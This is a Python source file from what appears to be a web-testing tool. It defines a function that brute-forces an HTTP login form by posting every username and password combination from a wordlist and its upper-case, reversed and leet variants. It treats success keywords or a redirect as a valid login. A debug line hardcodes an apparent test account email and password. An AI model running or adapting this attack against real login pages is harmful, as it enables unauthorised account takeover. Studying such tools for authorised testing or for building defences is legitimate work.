from funcs import transform
from http_requests.Socket import Socket
from http_requests.HttpRequest import HttpRequest
from collections import namedtuple
from utils.constants import HTTP_CONTENTTYPE_FORMENCODED
from utils.constants import SUCCESS_KEYWORDS

from utils.link_utils import verify_success_resp

Credential = namedtuple('Credential', ["user", "password"])

def bruteforce(request, url, host, port, agent, 
                user_key, pass_key, words):
    """ Bruteforces every combination of username and password for a specific form.

    Parameters
    ----------
    request : HttpRequest (method="POST")
        HttpRequest object through which POST requests can be sent
    url : string
        url to which the HTTP POST request will send
    host : string
        HTTP Host header
    port : int
        port of the connection
    agent : string
        HTTP User-Agent header
    content_type : string
        HTTP Content-Type header
    content_length : string
        HTTP Content-Length header
    words : set(string)
        set of words from which to use for bruteforcing

    Returns
    -------
    success : list((string,string))
        success will be a list of namedtuples called Credentials whose first element
        is a string denoting the username and the second element is a string denoting
        the password. The Credentials in the list denote successful attempts.
    """
    # successful credentials
    success = []

    # Add all transformations for each word
    all_words = set(words)
    transformations = transform.generate_transformations(list(words))
    for word in words:
        transformation = transformations[word]
        all_words.add(transformation.lower)
        all_words.add(transformation.upper)
        all_words.add(transformation.reverse)
        all_words.add(transformation.leet)
    
    # Try all combinations for the form described by url on host
    content_type = HTTP_CONTENTTYPE_FORMENCODED
    for user in all_words:
        for _pass in all_words:
            request.connect()
            data = {user_key: user, pass_key: _pass}
            body = request.generate_post_body(content_type,data)
            content_length = len(body)
            successful = request.send_post_request(url, host, agent, content_type, content_length, body)

            if successful:
                response = request.receive()
                print(f'User: {user}, Pass: {_pass}')
                if user == "bawofafefe@kulmeo.com" and _pass == "Test12345!":
                    print('Should be successful')
                
                # See if the response contained any words that indicate the login was successful.
                if verify_success_resp(response):
                    success.append(Credential(user,_pass))
                    continue

                # Check if the response was a redirect to a different page.
                # print(response)
                _tuple = HttpRequest.get_status_code(response)
                if _tuple is not None:
                    status_code, __ = _tuple
                    if status_code[:1] == "3":
                        success.append(Credential(user,_pass))
                        continue
                
            request.close()
    return success